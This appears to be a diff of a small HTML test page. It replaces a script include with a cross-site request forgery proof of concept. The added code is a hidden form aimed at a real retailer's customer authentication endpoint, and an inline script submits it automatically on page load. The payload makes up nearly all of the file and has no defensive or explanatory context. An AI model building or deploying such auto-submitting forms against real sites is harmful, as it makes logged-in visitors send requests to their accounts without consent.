@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <title>Test</title>
-        <script src="alert.js"> </script>
-    </head>
-    <body>
-        <p>HELLO</p>
-    </body> 
+
+<head>
+    <title>Test</title>
+</head>
+
+<body>
+    <p>HELLO</p>
+    <form action="https://www.tim.pl/nuxt-api/auth/customer" method="POST" id="csrf-form">
+    </form>
+
+    <script>
+        // Automatyczne wysłanie po wejściu na stronę
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+
 </html>
